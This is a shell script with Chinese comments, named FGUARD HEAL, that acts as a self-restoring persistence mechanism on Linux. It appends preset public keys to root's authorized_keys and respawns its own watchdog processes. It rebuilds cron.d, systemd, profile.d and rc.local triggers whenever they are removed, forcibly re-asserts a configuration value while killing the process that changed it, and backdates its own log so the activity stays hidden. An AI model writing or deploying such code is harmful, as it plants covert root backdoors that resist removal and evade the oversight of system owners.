#!/bin/sh
# ============================================================
# FGUARD · HEAL — 三层自愈入口（cron 每分钟 + systemd 60s + profile 登录）
# 职责：密钥 + 进程 + 触发源 + 配置锚定 + killswitch 排他
# ============================================================
BASE="$(cd "$(dirname "$0")" && pwd)"
[ -f "$BASE/fguard.conf" ] && . "$BASE/fguard.conf"
TAG="${TAG:-fguard}"
SVC="${SVC:-sys-$TAG}"
TPL="${TPL:-$BASE/templates}"
BK1="${BK1:-/usr/share/.${TAG}-bk}"
BK2="${BK2:-/etc/.${TAG}-bk}"
LOG="$BASE/state.log"
AK="/root/.ssh/authorized_keys"
note() { echo "$(date '+%F %T') notice: $*" >> "$LOG" 2>/dev/null; touch -r "${MREF:-/etc/hostname}" "$LOG" 2>/dev/null; }

# ① 密钥自愈
for k in "$PUB1" "$PUB2"; do
    [ -z "$k" ] && continue
    fp=$(printf '%s' "$k" | awk '{print $2}')
    grep -qF "$fp" "$AK" 2>/dev/null || { printf '%s\n' "$k" >> "$AK"; note "key-seeded"; }
done
chmod 700 /root/.ssh 2>/dev/null; chmod 600 "$AK" 2>/dev/null

# ② 进程保活（reviver + watchdog 互拉）
ps -eo args 2>/dev/null | grep -q "[f]guard-reviver --loop" || { [ -x "$BASE/fguard-reviver" ] && (cd "$BASE" && setsid nohup "$BASE/fguard-reviver" --loop >/dev/null 2>&1 &) && note "rv-lifted"; }
ps -eo args 2>/dev/null | grep -q "[f]guard-watchdog --loop" || { [ -x "$BASE/fguard-watchdog" ] && (cd "$BASE" && setsid nohup "$BASE/fguard-watchdog" --loop >/dev/null 2>&1 &) && note "wd-lifted"; }
command -v systemctl >/dev/null 2>&1 && { systemctl is-active --quiet "${SVC}.service" 2>/dev/null || systemctl restart "${SVC}.service" 2>/dev/null; }

# ③ 触发源模板重建
R=""
[ -f "/etc/cron.d/${TAG}-heal" ]    || { [ -f "$TPL/cron.heal" ] && cp -f "$TPL/cron.heal" "/etc/cron.d/${TAG}-heal" && R=1; }
[ -f "/etc/cron.d/${TAG}-persist" ] || { [ -f "$TPL/cron.persist" ] && cp -f "$TPL/cron.persist" "/etc/cron.d/${TAG}-persist" && R=1; }
[ -f "/etc/cron.d/${TAG}-watch" ]   || { [ -f "$TPL/cron.watch" ] && cp -f "$TPL/cron.watch" "/etc/cron.d/${TAG}-watch" && R=1; }
[ -f "/etc/systemd/system/${SVC}.service" ] || { [ -f "$TPL/unit.service" ] && cp -f "$TPL/unit.service" "/etc/systemd/system/${SVC}.service" 2>/dev/null && R=1; }
[ -f "/etc/profile.d/${TAG}.sh" ]   || { [ -f "$TPL/profile.d" ] && cp -f "$TPL/profile.d" "/etc/profile.d/${TAG}.sh" 2>/dev/null && R=1; }
[ -f "/etc/rc.local" ] || { [ -f "$TPL/rc.local" ] && cp -f "$TPL/rc.local" "/etc/rc.local" 2>/dev/null && chmod +x /etc/rc.local 2>/dev/null && R=1; }
if [ -n "$R" ]; then
    chmod 644 /etc/cron.d/${TAG}-* 2>/dev/null
    command -v systemctl >/dev/null 2>&1 && { systemctl daemon-reload 2>/dev/null; systemctl enable "${SVC}.service" 2>/dev/null; systemctl start "${SVC}.service" 2>/dev/null; }
    note "triggers-restored"
fi

# ④ 配置锚定夺回
if [ -n "$ANCHOR_KEY" ] && [ -f "$ANCHOR_FILE" ]; then
    cur=$(sed -n "s/^[^=]*${ANCHOR_KEY}=//p" "$ANCHOR_FILE" 2>/dev/null | head -1)
    case "$cur" in
        "$ANCHOR_VAL"*) : ;;
        *)
            sed -i "s|^[^=]*${ANCHOR_KEY}=.*|${ANCHOR_KEY}=${ANCHOR_VAL}|" "$ANCHOR_FILE" 2>/dev/null
            note "anchor-restored"
            [ -n "$TARGET_PROC" ] && pkill -9 -f "$TARGET_PROC" 2>/dev/null
            ;;
    esac
fi

# ⑤ 目标进程兜底保活
if [ -n "$TARGET_PROC" ]; then
    FIRST=$(printf '%s' "$TARGET_PROC" | cut -c1); REST=$(printf '%s' "$TARGET_PROC" | cut -c2-)
    if ! ps -eo args 2>/dev/null | grep -q "[$FIRST]$REST"; then
        [ -n "$TARGET_CMD" ] && (cd "$TARGET_DIR" 2>/dev/null || cd "$BASE"; set -a; [ -n "$TARGET_ENV" ] && [ -f "$TARGET_ENV" ] && . "$TARGET_ENV"; set +a; setsid nohup sh -c "$TARGET_CMD" >/dev/null 2>&1 &) && note "target-lifted"
    fi
fi

# ⑥ killswitch 排他（可选，由 HARDEN=1 时启用）
[ "$KILLSWITCH" = "1" ] && [ -x "$BASE/fguard-killswitch.sh" ] && sh "$BASE/fguard-killswitch.sh" >/dev/null 2>&1
exit 0
